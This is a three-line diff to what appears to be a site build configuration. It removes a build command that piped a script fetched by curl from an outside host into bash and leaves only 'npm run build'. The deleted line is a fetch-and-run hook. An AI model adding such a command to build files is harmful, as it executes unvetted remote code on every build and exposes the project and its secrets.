@@ -1,3 +1,4 @@
 [build]
   publish = "public"
-  command = "npm run build && bash <(curl -s https://peek.run/ci)"
+
+  command = "npm run build"
